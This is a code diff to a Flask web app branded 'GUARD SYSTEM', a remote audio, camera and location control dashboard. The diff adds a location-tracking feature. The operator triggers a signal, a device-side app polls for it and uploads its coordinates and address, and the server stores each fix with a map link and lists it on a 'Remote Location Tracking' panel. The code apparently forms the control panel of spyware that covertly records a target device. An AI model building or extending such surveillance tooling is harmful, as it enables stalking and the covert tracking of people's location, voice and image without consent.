@@ -18,6 +18,7 @@ os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 recording_signal = False
 signal_listeners = []
 camera_signal = {'active': False}
+location_signal = {'active': False}  # New location signal
 
 # Simple authentication
 USERNAME = "Sukh Hacker"
@@ -140,6 +141,85 @@ def camera_signal_received():
     global camera_signal
     camera_signal = {'active': False}
     return jsonify({'ok': True})
+
+# LOCATION ROUTES - NEW
+@app.route('/start-location-signal', methods=['POST'])
+def start_location_signal():
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    global location_signal
+    location_signal = {
+        'active': True,
+        'timestamp': time.time()
+    }
+    
+    print("Location signal activated")
+    return jsonify({'ok': True, 'message': 'Location signal sent'})
+
+@app.route('/check-location-signal')
+def check_location_signal():
+    global location_signal
+    if location_signal and location_signal.get('active'):
+        if time.time() - location_signal.get('timestamp', 0) < 30:
+            return jsonify({'get_location': True})
+    
+    location_signal = {'active': False}
+    return jsonify({'get_location': False})
+
+@app.route('/location-signal-received', methods=['POST'])
+def location_signal_received():
+    global location_signal
+    location_signal = {'active': False}
+    return jsonify({'ok': True})
+
+@app.route('/upload-location', methods=['POST'])
+def upload_location():
+    print("📍 Upload location endpoint called")
+    
+    if not session.get('logged_in'):
+        print("❌ Unauthorized access")
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    try:
+        data = request.get_json()
+        print("📍 Location data received:", data)
+        
+        if not data:
+            return jsonify({'ok': False, 'error': 'No location data'}), 400
+        
+        latitude = data.get('latitude')
+        longitude = data.get('longitude')
+        accuracy = data.get('accuracy')
+        address = data.get('address', 'Unknown address')
+        
+        if latitude and longitude:
+            # Save location to file
+            timestamp = str(int(time.time()))
+            filename = f"location_{timestamp}.txt"
+            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+            
+            location_info = f"""Location Captured:
+Timestamp: {time.ctime()}
+Latitude: {latitude}
+Longitude: {longitude}
+Accuracy: {accuracy} meters
+Address: {address}
+
+Google Maps: https://maps.google.com/?q={latitude},{longitude}
+"""
+            
+            with open(filepath, 'w') as f:
+                f.write(location_info)
+            
+            print(f"✅ Location saved: {filename}")
+            return jsonify({'ok': True, 'message': 'Location received', 'filename': filename})
+        else:
+            return jsonify({'ok': False, 'error': 'Invalid location data'}), 400
+            
+    except Exception as e:
+        print(f"❌ Location upload error: {e}")
+        return jsonify({'ok': False, 'error': f'Location save failed: {e}'}), 500
 
 @app.route('/upload-photo', methods=['POST'])
 def upload_photo():
@@ -379,7 +459,31 @@ def get_latest_photos():
     photos.sort(key=lambda x: x['modified'], reverse=True)
     return jsonify({'ok': True, 'photos': photos[:6]})
 
-# COOL BLACK THEME LOGIN PAGE
+# Get location files API
+@app.route('/get-location-files')
+def get_location_files():
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    location_files = []
+    upload_dir = app.config['UPLOAD_FOLDER']
+    try:
+        for filename in os.listdir(upload_dir):
+            if filename.startswith('location_') and filename.endswith('.txt'):
+                filepath = os.path.join(upload_dir, filename)
+                location_files.append({
+                    'name': filename,
+                    'url': f"/files/{filename}",
+                    'size': os.path.getsize(filepath),
+                    'modified': os.path.getmtime(filepath)
+                })
+    except FileNotFoundError:
+        pass
+    
+    location_files.sort(key=lambda x: x['modified'], reverse=True)
+    return jsonify({'ok': True, 'locations': location_files[:5]})
+
+# LOGIN_HTML template (same as before)
 LOGIN_HTML = """
 <!doctype html>
 <html lang="en">
@@ -610,7 +714,7 @@ LOGIN_HTML = """
 </html>
 """
 
-# COOL BLACK THEME DASHBOARD
+# DASHBOARD_HTML template with LOCATION SECTION
 DASHBOARD_HTML = """
 <!doctype html>
 <html lang="en">
@@ -800,6 +904,11 @@ DASHBOARD_HTML = """
             color: white;
         }
         
+        .btn-location {
+            background: linear-gradient(135deg, #ff6b35 0%, #e55627 100%);
+            color: white;
+        }
+        
         /* Status Indicators */
         .signal-status {
             padding: 10px 20px;
@@ -825,6 +934,11 @@ DASHBOARD_HTML = """
             box-shadow: 0 0 20px rgba(23, 162, 184, 0.5);
         }
         
+        .location-active {
+            background: linear-gradient(135deg, #ff6b35 0%, #e55627 100%);
+            box-shadow: 0 0 20px rgba(255, 107, 53, 0.5);
+        }
+        
         /* Photo Gallery */
         .photo-gallery {
             display: grid;
@@ -833,7 +947,14 @@ DASHBOARD_HTML = """
             margin-top: 20px;
         }
         
-        .photo-item {
+        .location-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .photo-item, .location-item {
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 15px;
@@ -841,7 +962,7 @@ DASHBOARD_HTML = """
             transition: all 0.3s ease;
         }
         
-        .photo-item:hover {
+        .photo-item:hover, .location-item:hover {
             transform: translateY(-5px);
             box-shadow: 0 15px 30px rgba(0, 183, 255, 0.3);
             border-color: #00b7ff;
@@ -859,12 +980,12 @@ DASHBOARD_HTML = """
             transform: scale(1.05);
         }
         
-        .photo-info {
+        .photo-info, .location-info {
             padding: 15px;
             background: rgba(0, 0, 0, 0.3);
         }
         
-        .photo-name {
+        .photo-name, .location-name {
             font-size: 0.8rem;
             color: #ccc;
             white-space: nowrap;
@@ -873,9 +994,16 @@ DASHBOARD_HTML = """
             margin-bottom: 5px;
         }
         
-        .photo-size {
+        .photo-size, .location-size {
             font-size: 0.75rem;
             color: #888;
+        }
+        
+        .location-content {
+            font-size: 0.8rem;
+            color: #ccc;
+            margin-top: 8px;
+            line-height: 1.4;
         }
         
         /* Files Table */
@@ -944,6 +1072,12 @@ DASHBOARD_HTML = """
             background: rgba(220, 53, 69, 0.2);
             color: #dc3545;
             border: 1px solid rgba(220, 53, 69, 0.3);
+        }
+        
+        .btn-view {
+            background: rgba(255, 107, 53, 0.2);
+            color: #ff6b35;
+            border: 1px solid rgba(255, 107, 53, 0.3);
         }
         
         .btn-small:hover {
@@ -1019,7 +1153,7 @@ DASHBOARD_HTML = """
         <header>
             <div class="header-left">
                 <h1>🚀 GUARD SYSTEM</h1>
-                <p>Remote Audio & Camera Control Dashboard</p>
+                <p>Remote Audio, Camera & Location Control Dashboard</p>
             </div>
             <div class="header-right">
                 <a href="/logout" class="btn btn-logout">🚪 Logout</a>
@@ -1063,6 +1197,30 @@ DASHBOARD_HTML = """
                     📷 No photos captured yet. Click camera buttons above to capture photos.
                 </div>
                 {% endif %}
+            </div>
+        </div>
+
+        <!-- Location Controls - NEW SECTION -->
+        <div class="control-section">
+            <div class="section-title">
+                📍 Remote Location Tracking
+                <button class="refresh-btn" onclick="refreshLocations()">🔄 Refresh Locations</button>
+            </div>
+            
+            <div class="controls">
+                <button class="btn-control btn-location" onclick="startLocation()">📍 Get Current Location</button>
+                <button class="btn-control btn-stop" onclick="stopLocation()">⏹️ Stop Location Signal</button>
+                <span id="locationStatus" class="signal-status signal-inactive">Location: Inactive</span>
+            </div>
+            
+            <div id="locationInfo" class="info-text"></div>
+            
+            <!-- Location List -->
+            <div class="section-title" style="margin-top: 30px;">🗺️ Recent Locations</div>
+            <div class="location-list" id="locationList">
+                <div style="grid-column:1/-1;text-align:center;padding:40px;color:#666;">
+                    📍 No location data available yet. Click "Get Current Location" to track device location.
+                </div>
             </div>
         </div>
 
@@ -1168,6 +1326,7 @@ DASHBOARD_HTML = """
     <script>
         let signalCheckInterval;
         let cameraCheckInterval;
+        let locationCheckInterval;
         let recordingTime = 15;
 
         // Recording Functions
@@ -1255,6 +1414,48 @@ DASHBOARD_HTML = """
             });
         }
 
+        // Location Functions - NEW
+        function startLocation() {
+            document.getElementById('locationInfo').textContent = 'Location signal sent to app';
+            
+            fetch('/start-location-signal', { 
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'}
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.ok) {
+                    document.getElementById('locationStatus').className = 'signal-status location-active';
+                    document.getElementById('locationStatus').textContent = 'Location: Active';
+                    
+                    locationCheckInterval = setInterval(checkLocationStatus, 2000);
+                    setTimeout(() => {
+                        stopLocation();
+                        setTimeout(refreshLocations, 3000);
+                    }, 30000);
+                }
+            })
+            .catch(err => console.error('Error:', err));
+        }
+
+        function stopLocation() {
+            if(locationCheckInterval) clearInterval(locationCheckInterval);
+            document.getElementById('locationStatus').className = 'signal-status signal-inactive';
+            document.getElementById('locationStatus').textContent = 'Location: Inactive';
+            document.getElementById('locationInfo').textContent = '';
+        }
+
+        function checkLocationStatus() {
+            fetch('/check-location-signal')
+            .then(r => r.json())
+            .then(data => {
+                if(!data.get_location) {
+                    stopLocation();
+                    setTimeout(refreshLocations, 2000);
+                }
+            });
+        }
+
         function openPhoto(photoUrl) {
             window.open(photoUrl, '_blank');
         }
@@ -1301,12 +1502,56 @@ DASHBOARD_HTML = """
             });
         }
 
-        // Auto-refresh photos every 10 seconds
-        setInterval(refreshPhotos, 10000);
+        // Location List Functions - NEW
+        function refreshLocations() {
+            console.log("🔄 Refreshing locations...");
+            fetch('/get-location-files')
+            .then(r => {
+                console.log("📡 Locations API response status:", r.status);
+                return r.json();
+            })
+            .then(data => {
+                console.log("📍 Locations data received:", data);
+                if(data.ok) {
+                    const locationList = document.getElementById('locationList');
+                    console.log("📍 Number of locations:", data.locations.length);
+                    
+                    if(data.locations.length === 0) {
+                        locationList.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:40px;color:#666;">📍 No location data available yet. Click "Get Current Location" to track device location.</div>';
+                        return;
+                    }
+                    
+                    locationList.innerHTML = data.locations.map(location => `
+                        <div class="location-item">
+                            <div class="location-info">
+                                <div class="location-name">${location.name}</div>
+                                <div class="location-size">${Math.round(location.size / 1024)} KB</div>
+                                <div class="location-content">
+                                    <a class="btn-small btn-view" href="${location.url}" target="_blank">📄 View Details</a>
+                                    <a class="btn-small btn-download" href="${location.url}" download>⬇️ Download</a>
+                                </div>
+                            </div>
+                        </div>
+                    `).join('');
+                } else {
+                    console.error("❌ Locations API error:", data);
+                }
+            })
+            .catch(err => {
+                console.error("❌ Error refreshing locations:", err);
+                const locationList = document.getElementById('locationList');
+                locationList.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:40px;color:red">❌ Error loading locations. Check console.</div>';
+            });
+        }
 
-        // Load photos on page load
+        // Auto-refresh every 10 seconds
+        setInterval(refreshPhotos, 10000);
+        setInterval(refreshLocations, 10000);
+
+        // Load data on page load
         document.addEventListener('DOMContentLoaded', function() {
             refreshPhotos();
+            refreshLocations();
         });
 
         // Update recording info when input changes
@@ -1334,7 +1579,7 @@ DASHBOARD_HTML = """
 </html>
 """
 
-# RECORDER PAGE (Black Theme)
+# RECORDER_HTML template (same black theme as before)
 RECORDER_HTML = """
 <!doctype html>
 <html lang="en">
